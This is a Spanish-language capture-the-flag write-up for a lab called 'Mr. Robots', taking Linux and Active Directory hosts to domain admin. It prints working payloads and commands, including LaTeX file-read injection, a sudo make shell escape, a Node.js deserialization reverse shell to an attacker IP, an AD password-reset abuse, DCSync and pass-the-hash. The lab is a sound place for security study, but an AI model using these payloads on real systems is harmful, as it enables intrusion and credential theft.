
# 🚀 Resolución del CTF **Mr. Robots** - Write-up Detallado

> *"La paciencia es la clave, pero también lo es la creatividad."*
> — **Mr. Robot**

---

## 📌 **Índice**
1. [🔍 Enumeración Inicial](#-enumeración-inicial)
2. [🌐 Explotación Web (HTTP)](#-explotación-web-http)
3. [🔓 Escalada de Privilegios en Contenedor Linux](#-escalada-de-privilegios-en-contenedor-linux)
4. [🔗 Pivoting y Acceso Root](#-pivoting-y-acceso-root)
5. [💻 Post-Explotación: Extracción de Credenciales](#-post-explotación-extracción-de-credenciales)
6. [🏢 Active Directory: Compromiso del Dominio](#-active-directory-compromiso-del-dominio)
7. [🎯 Escalada Final: Dominio como Administrador](#-escalada-final-dominio-como-administrador)
8. [📂 Archivos Adicionales](#-archivos-adicionales)

---

## 🔍 **Enumeración Inicial**

### 📡 **Escaneo de Puertos con Nmap**
Realizamos un escaneo agresivo para identificar servicios activos, optimizando el tiempo con un alto ritmo de paquetes.

```bash
nmap -p- --open -sCV -Pn -n --min-rate 5000 192.168.1.17
```

**🔹 Resultados:**
```plaintext
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 9.2p1 Debian 2+deb12u3
80/tcp   open  http        Apache httpd 2.4.65 ((Debian))
2222/tcp open  ssh         OpenSSH 10.0p2 Debian 7
```

🔹 **Hallazgos clave:**
- **SSH** en puertos **22** y **2222**.
- **Servicio HTTP** en el puerto **80** (Apache 2.4.65).
- Sistema operativo: **Linux (Debian)**.

---

## 🌐 **Explotación Web (HTTP)**

### 🌐 **1. Configuración de Dominios en `/etc/hosts`**
Para replicar el entorno esperado por la aplicación, asociamos la IP a dominios ficticios:

```bash
echo "192.168.1.17 allsafe.thl" >> /etc/hosts
echo "192.168.1.17 intranet.allsafe.thl" >> /etc/hosts
```

### 🔍 **2. Fuzzing Web para Descubrir Subdominios**
Detectamos un panel de **intranet** oculto:

```bash
echo "192.168.1.17 intranet.allsafe.thl" >> /etc/hosts
```

### 🕵️ **3. Credenciales en Contenido Estático**
En la sección **"Nuestro Equipo"** encontramos una imagen con la **tarjeta de identificación** de un empleado:

- **Número de empleado:** `0-477-9990`
- **Sección de contacto:** `0-477-9990:123456Seven`

🔹 **Acceso al panel interno:**
- Usuario: `0-477-9990`
- Contraseña: `123456Seven`

---

## 🔓 **Inyección LaTeX para Lectura de Archivos**

El panel procesa contenido **LaTeX sin sanitización**, permitiendo **lectura de archivos locales**:

```latex
\lstinputlisting{/etc/passwd}
```

**🔹 Usuarios locales enumerados:**
```plaintext
root:x:0:0:root:/root:/bin/bash
parker:x:1000:1000::/home/parker:/bin/bash
gideon:x:1001:1001::/home/gideon:/bin/bash
```

**🔹 Credenciales de Gideon:**
```plaintext
gideon:mp38nqUfTAa0IM1Op0aW
```

---

## 🔓 **Escalada de Privilegios en Contenedor Linux**

El usuario **Gideon** tiene permisos **sudo sobre `make`**:

```bash
sudo make -s --eval='all:; /bin/bash'
```

🔹 **Acceso como root en el contenedor.**

### 📂 **Extracción de Credenciales Sensibles**
Accedemos a un **gestor de contraseñas** (`secrets.psafe3`) y lo exfiltramos en **Base64**:

```bash
cat secrets.psafe3 | base64
```

**🔹 Credenciales obtenidas:**
```plaintext
cisco:sMpam!dE#8@$$1P%bnV@fFxdqjFFG#
```

---

## 🔗 **Pivoting y Acceso Root**

### 🔄 **Port Forwarding con SSH**
Exponemos un servicio interno en el puerto **3000**:

```bash
ssh cisco@192.168.1.17 -L 3000:127.0.0.1:3000
```

### 💀 **Serialización Insegura para RCE**
La aplicación usa **serialización insegura**, permitiendo ejecución remota de comandos mediante una **cookie manipulada**:

**🔹 Payload para Reverse Shell (Node.js):**
```json
{"test":"_$$ND_FUNC$$_function(){ require('child_process').execSync(\"bash -c 'bash -i >& /dev/tcp/192.168.1.19/443 0>&1'\", function puts(error, stdout, stderr) {});}()"}
```

**🔹 Conversión a Base64 y envío:**
```bash
nc -lnvp 443
```

🔹 **Acceso como root en el sistema.**

---

## 💻 **Post-Explotación: Extracción de Credenciales para AD**

### 📁 **Montaje de Imagen de Disco**
Encontramos `ecorp.img` y `note.txt` en `.confidencial`:

```bash
mkdir /mnt/ecorp
mount -o loop ecorp.img /mnt/ecorp
```

**🔹 Credenciales de `lloyd.chong`:**
```plaintext
lloyd.chong:C6c56\2)+*gpxs#
```

---

## 🏢 **Active Directory: Compromiso del Dominio**

### 🌐 **Enumeración de Puertos Críticos**
```bash
sudo nmap -sS -Pn --open --min-rate 5000 -n 10.23.52.1 -oG allPorts
```

**🔹 Puertos críticos de AD:**
```plaintext
53,80,88,135,139,389,445,464,593,636,3268,3269,5985
```

### 🔍 **Configuración de Dominio**
```bash
echo '10.23.52.1 ecorp.thl' >> /etc/hosts
```

### 🩸 **Enumeración con BloodHound**
```bash
bloodhound-python -u lloyd.chong -p'C6c56\2)+*gpxs#' -d ecorp.thl -ns 10.23.52.1 -c all --zip
```

**🔹 Path de ataque identificado:**
- **GenericAll** sobre el grupo **E-CORP**.

### 🛡️ **Abuso de Permisos**
```bash
net rpc group addmem "E-CORP" "lloyd.chong" -U "ECORP/lloyd.chong%C6c56\2)+*gpxs#" -S 10.23.52.1
```

### 🔐 **Cambio de Contraseñas con BloodyAD**
```bash
bloodyAD --host 10.23.52.1 -d ecorp.thl -u lloyd.chong -p'C6c56\2)+*gpxs#' set password PHILLIP.PRICE astro@1234!
bloodyAD --host 10.23.52.1 -d ecorp.thl -u lloyd.chong -p'C6c56\2)+*gpxs#' set password TYRELL.WELLICK astro@1234!
```

---

## 🎯 **Escalada Final: Dominio como Administrador**

### 🔄 **Acceso a Usuarios con Administración Remota**
- **Phillip.Price** y **Tyrell.Wellick** son miembros del grupo **Administración Remota**.

### 📂 **Tarea Programada Vulnerable**
Encontramos un **`.exe`** que ejecuta un **`.dll`** llamado `DeskHelper.dll`.

**🔹 Payload para DLL Maliciosa:**
```c
#include <winsock2.h>
#include <windows.h>

BOOL ReverseShell() {
    // ... (código para reverse shell)
}

__declspec(dllexport) void deskHelper() {
    ReverseShell();
}
```

**🔹 Compilación:**
```bash
x86_64-w64-mingw32-gcc -shared -o DeskHelper.dll rev.c -lws2_32 -Wl,--subsystem,windows
```

### 🚀 **Ejecución de DLL Maliciosa**
Subimos el `.dll` y esperamos a que se ejecute la tarea programada.

🔹 **Acceso como `mr.robot`.**

### 🔑 **DCSync para Hash del Administrador**
Encontramos credenciales de **Elliot.Alderson** en el historial:

```bash
impacket-secretsdump ecorp.thl/elliot.alderson:'mrR0b0t_fS0c!ety'@10.23.52.1
```

### 🔐 **Pass-the-Hash con Evil-WinRM**
```bash
evil-winrm -i 10.23.52.1 -u Administrador -H 8fb13172ab29ce6f4XXXXXXXXXXXXXXX
```

🔹 **Acceso como **Administrador del dominio** completado.**

---

## 📂 **Archivos Adicionales**

| Archivo | Descripción |
|---------|-------------|
| `ecorp.img` | Imagen de disco con credenciales reutilizables. |
| `note.txt` | Notas internas con pistas adicionales. |
| `fscociety00.dat` | Archivo con credenciales de `lloyd.chong`. |
| `darkarmy.bin` | **Pista falsa** (no relevante). |

---

## 🏆 **Conclusión**

🔹 **Objetivo cumplido:** Acceso completo al sistema como **Administrador del dominio**.
🔹 **Técnicas clave:**
- **Inyección LaTeX** para lectura de archivos.
- **Escalada con `make`** en contenedor Linux.
- **Serialización insegura** para RCE.
- **Abuso de permisos en AD** con BloodHound.
- **DLL Hijacking** para ejecución de código.
- **DCSync y Pass-the-Hash** para dominio.

📌 **Lección aprendida:** *"La enumeración meticulosa y la creatividad son esenciales en un CTF."*
